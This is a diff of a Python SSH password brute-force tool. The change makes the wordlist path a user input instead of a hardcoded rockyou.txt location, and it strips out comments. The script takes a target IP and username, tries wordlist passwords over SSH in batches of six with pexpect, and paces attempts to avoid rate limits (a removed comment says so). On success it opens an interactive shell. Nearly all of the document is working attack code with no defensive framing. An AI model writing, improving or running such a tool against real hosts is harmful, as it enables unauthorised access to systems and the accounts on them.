@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-SSH Password Brute-Force Script
-Reads passwords from ~/Downloads/rockyou.txt, tries 6 at a time,
-restarting the SSH connection between batches.
-"""
 
 import os
 import sys
@@ -12,38 +7,30 @@ import pexpect
 
 
 def get_user_input():
-    """Prompt the user for the target IP address and username."""
     print("=" * 50)
     print("SSH Password Brute-Force Tool")
     print("=" * 50)
     ip = input("Enter target IP address: ").strip()
     username = input("Enter SSH username: ").strip()
-    if not ip or not username:
-        print("[!] IP address and username are required.")
+    wordlist_path = input("Enter path to password .txt file: ").strip()
+    if not ip or not username or not wordlist_path:
+        print("[!] IP address, username, and password file path are required.")
         sys.exit(1)
-    return ip, username
-
-
-def load_passwords(filepath="~/Downloads/rockyou.txt"):
-    """Load passwords from the rockyou.txt wordlist."""
-    expanded_path = os.path.expanduser(filepath)
+    expanded_path = os.path.expanduser(wordlist_path)
     if not os.path.exists(expanded_path):
         print(f"[!] Password file not found: {expanded_path}")
-        print("[!] Make sure ~/Downloads/rockyou.txt exists.")
         sys.exit(1)
+    return ip, username, expanded_path
 
-    with open(expanded_path, "r", encoding="utf-8", errors="ignore") as f:
+
+def load_passwords(filepath):
+    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
         passwords = [line.strip() for line in f if line.strip()]
-
-    print(f"[+] Loaded {len(passwords)} passwords from {expanded_path}")
+    print(f"[+] Loaded {len(passwords)} passwords from {filepath}")
     return passwords
 
 
 def try_passwords(ip, username, passwords, batch_size=6):
-    """
-    Attempt to SSH into the target using passwords in batches.
-    After each batch of `batch_size` attempts, restarts the connection.
-    """
     total = len(passwords)
     batch_num = 0
 
@@ -70,7 +57,6 @@ def try_passwords(ip, username, passwords, batch_size=6):
             try:
                 child = pexpect.spawn(ssh_command, timeout=15, encoding="utf-8")
 
-                # Wait for password prompt
                 idx = child.expect(
                     [
                         "password:",
@@ -85,18 +71,17 @@ def try_passwords(ip, username, passwords, batch_size=6):
                     timeout=15,
                 )
 
-                if idx in [0, 1]:  # Password prompt received
+                if idx in [0, 1]:
                     child.sendline(password)
-                    # Wait to see if login succeeds or fails
                     result_idx = child.expect(
                         [
-                            "password:",  # Wrong password, prompt again
-                            "Password:",  # Wrong password, prompt again
+                            "password:",
+                            "Password:",
                             "Permission denied",
-                            "Last login",  # Successful login indicator
-                            "Welcome",  # Successful login indicator
-                            r"\$",  # Shell prompt (success)
-                            "#",  # Root shell prompt
+                            "Last login",
+                            "Welcome",
+                            r"\$",
+                            "#",
                             pexpect.EOF,
                             pexpect.TIMEOUT,
                         ],
@@ -110,13 +95,12 @@ def try_passwords(ip, username, passwords, batch_size=6):
                         print(f"\n[+] SSH connection established as {username}@{ip}")
                         print("[+] Interactive shell is now active.\n")
 
-                        # Return control to the user for the interactive session
                         child.interact()
                         return password
                     else:
                         print(f"[-] Incorrect password: {password}")
 
-                elif idx in [2, 3, 4, 5]:  # Immediate failure
+                elif idx in [2, 3, 4, 5]:
                     print(f"[-] Connection issue detected. Skipping batch...")
                     child.close()
                     time.sleep(2)
@@ -144,11 +128,9 @@ def try_passwords(ip, username, passwords, batch_size=6):
                 except Exception:
                     pass
 
-            # Small delay between attempts to avoid triggering rate limits
             if attempt < len(batch):
                 time.sleep(1)
 
-        # Delay between batches to allow connection cleanup
         if i + batch_size < total:
             print(f"\n[*] Restarting connection for next batch...")
             time.sleep(3)
@@ -158,25 +140,7 @@ def try_passwords(ip, username, passwords, batch_size=6):
 
 
 def main():
-    ip, username = get_user_input()
-
-    wordlist_path = os.path.expanduser("~/Downloads/rockyou.txt")
-    if not os.path.exists(wordlist_path):
-        # Also check the Desktop/Downloads path
-        alt_paths = [
-            "/Users/bestmomeverbuchholz/Downloads/rockyou.txt",
-            "/Users/bestmomeverbuchholz/Desktop/downloads/rockyou.txt",
-        ]
-        for alt in alt_paths:
-            if os.path.exists(alt):
-                wordlist_path = alt
-                break
-        else:
-            print(f"[!] Cannot find rockyou.txt. Checked:")
-            print(f"    ~/Downloads/rockyou.txt")
-            for alt in alt_paths:
-                print(f"    {alt}")
-            sys.exit(1)
+    ip, username, wordlist_path = get_user_input()
 
     passwords = load_passwords(wordlist_path)
 
